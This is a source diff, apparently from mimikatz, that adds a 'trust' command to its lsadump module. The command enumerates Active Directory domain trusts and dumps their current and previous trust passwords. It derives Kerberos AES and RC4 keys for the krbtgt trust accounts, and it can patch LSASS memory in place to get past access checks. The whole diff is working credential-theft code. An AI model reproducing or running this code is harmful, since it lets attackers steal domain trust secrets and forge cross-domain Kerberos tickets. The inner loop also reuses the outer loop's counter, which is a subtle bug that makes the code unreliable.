@@ -10,6 +10,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_secrets,L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
 	{kuhl_m_lsadump_cache,	L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
 	{kuhl_m_lsadump_lsa,	L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
+	{kuhl_m_lsadump_trust,	L"trust",		L"Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)"},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -1286,4 +1287,149 @@ PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_
 		}
 	}
 	return (PKERB_KEY_DATA_NEW) ((PBYTE) keys + Count * sizeof(KERB_KEY_DATA_NEW));
+}
+
+const wchar_t * TRUST_AUTH_TYPE[] = {
+	L"NONE    ",
+	L"NT4OWF  ",
+	L"CLEAR   ",
+	L"VERSION ",
+};
+const UNICODE_STRING uKrbtgt = {12, 14, L"krbtgt"};
+void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD count, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest)
+{
+	DWORD i;
+	UNICODE_STRING dst, password;
+	LONG kerbType[] = {KERB_ETYPE_AES256_CTS_HMAC_SHA1_96, KERB_ETYPE_AES128_CTS_HMAC_SHA1_96, KERB_ETYPE_RC4_HMAC_NT};
+
+	kprintf(L" [%s] %wZ -> %wZ\n", prefix, from, dest);
+	for(i = 0; i < count; i++)
+	{
+		kprintf(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &info[i].LastUpdateTime);
+		kprintf((info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[info[i].AuthType] : L"unknown?");
+		kull_m_string_wprintf_hex(info[i].AuthInfo, info[i].AuthInfoLength, 1); kprintf(L"\n");
+
+		if(info[i].AuthType == TRUST_AUTH_TYPE_CLEAR)
+		{
+			dst.Length = 0;
+			dst.MaximumLength = from->Length + uKrbtgt.Length + dest->Length;
+			if(dst.Buffer = (PWSTR) LocalAlloc(LPTR, dst.MaximumLength))
+			{
+				RtlAppendUnicodeStringToString(&dst, from);
+				RtlAppendUnicodeStringToString(&dst, &uKrbtgt);
+				RtlAppendUnicodeStringToString(&dst, dest);
+				password.Length = password.MaximumLength = (USHORT) info[i].AuthInfoLength;
+				password.Buffer = (PWSTR) info[i].AuthInfo;
+				for(i = 0; i < ARRAYSIZE(kerbType); i++)
+					kuhl_m_kerberos_hash_data(kerbType[i], &password, &dst, 4096);
+				LocalFree(dst.Buffer);
+			}
+		}
+	}
+	kprintf(L"\n");
+}
+
+BYTE PATC_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xeb};
+#ifdef _M_X64
+BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xbb, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-11}},
+};
+#elif defined _M_IX86
+BYTE PTRN_WALL_LsaDbrQueryInfoTrustedDomain[] = {0xc7, 0x45, 0xfc, 0x03, 0x00, 0x00, 0xc0, 0xe9};
+KULL_M_PATCH_GENERIC QueryInfoTrustedDomainReferences[] = {
+	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WALL_LsaDbrQueryInfoTrustedDomain),	PTRN_WALL_LsaDbrQueryInfoTrustedDomain},	{sizeof(PATC_WALL_LsaDbrQueryInfoTrustedDomain),	PATC_WALL_LsaDbrQueryInfoTrustedDomain},	{-10}},
+};
+#endif
+NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
+{
+	LSA_HANDLE hLSA;
+	LSA_ENUMERATION_HANDLE hLSAEnum = 0;
+	LSA_OBJECT_ATTRIBUTES oaLsa = {0};
+	NTSTATUS statusEnum, status;
+	PPOLICY_DNS_DOMAIN_INFO pDomainInfo;
+	PTRUSTED_DOMAIN_INFORMATION_EX domainInfoEx;
+	PTRUSTED_DOMAIN_AUTH_INFORMATION authinfos = NULL;
+	DWORD i, returned;
+
+	PKULL_M_PATCH_GENERIC currentReference;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;
+	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
+	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModule;
+	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &hLocalMemory}, aPatchMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_SEARCH sMemory;
+
+	static BOOL isPatching = FALSE;
+
+	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
+	{
+		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		{
+			aPatternMemory.address = currentReference->Search.Pattern;
+			aPatchMemory.address = currentReference->Patch.Pattern;
+
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
+			{
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				{
+					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
+					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
+					isPatching = TRUE;
+					if(!kull_m_patch(&sMemory, &aPatternMemory, currentReference->Search.Length, &aPatchMemory, currentReference->Patch.Length, currentReference->Offsets.off0, kuhl_m_lsadump_trust, argc, argv, NULL))
+						PRINT_ERROR_AUTO(L"kull_m_patch");
+					isPatching = FALSE;
+				}
+				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
+			}
+		}
+	}
+	else
+	{
+		if(NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
+		{
+			status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID *) &pDomainInfo);
+			if(NT_SUCCESS(status))
+			{
+				RtlUpcaseUnicodeString(&pDomainInfo->DnsDomainName, &pDomainInfo->DnsDomainName, FALSE);
+				kprintf(L"\nCurrent domain: %wZ (%wZ", &pDomainInfo->DnsDomainName, &pDomainInfo->Name);
+				if(pDomainInfo->Sid)
+					kprintf(L" / "); kull_m_string_displaySID(pDomainInfo->Sid);
+				kprintf(L")\n");
+
+				for(
+					hLSAEnum = 0, statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned);
+					(statusEnum == STATUS_SUCCESS) || (statusEnum == STATUS_MORE_ENTRIES);
+				statusEnum = LsaEnumerateTrustedDomainsEx(hLSA, &hLSAEnum, (PVOID *) &domainInfoEx, 0, &returned)
+					)
+				{
+					for(i = 0; i < returned; i++)
+					{
+						RtlUpcaseUnicodeString(&domainInfoEx[i].Name, &domainInfoEx[i].Name, FALSE);
+						kprintf(L"\nDomain: %wZ (%wZ", &domainInfoEx[i].Name, &domainInfoEx[i].FlatName);
+						if(domainInfoEx[i].Sid)
+							kprintf(L" / "); kull_m_string_displaySID(domainInfoEx[i].Sid);
+						kprintf(L")\n");
+
+						status = LsaQueryTrustedDomainInfoByName(hLSA, &domainInfoEx[i].Name, TrustedDomainAuthInformation, (PVOID *) &authinfos);
+						if(NT_SUCCESS(status))
+						{
+							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingAuthenticationInformation, authinfos->IncomingAuthInfos, L"  In ", &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
+							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingAuthenticationInformation, authinfos->OutgoingAuthInfos, L" Out ", &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
+							kuhl_m_lsadump_trust_authinformation(authinfos->IncomingPreviousAuthenticationInformation, authinfos->IncomingAuthInfos, L" In-1", &domainInfoEx[i].Name, &pDomainInfo->DnsDomainName);
+							kuhl_m_lsadump_trust_authinformation(authinfos->OutgoingPreviousAuthenticationInformation, authinfos->OutgoingAuthInfos, L"Out-1", &pDomainInfo->DnsDomainName, &domainInfoEx[i].Name);
+							LsaFreeMemory(authinfos);
+						}
+						else PRINT_ERROR(L"LsaQueryTrustedDomainInfoByName %08x\n", status);
+					}
+					LsaFreeMemory(domainInfoEx);
+				}
+				if(statusEnum != STATUS_NO_MORE_ENTRIES)
+					PRINT_ERROR(L"LsaEnumerateTrustedDomainsEx %08x\n", statusEnum);
+
+				LsaFreeMemory(pDomainInfo);
+			}
+			LsaClose(hLSA);
+		}
+	}
+	return STATUS_SUCCESS;
 }
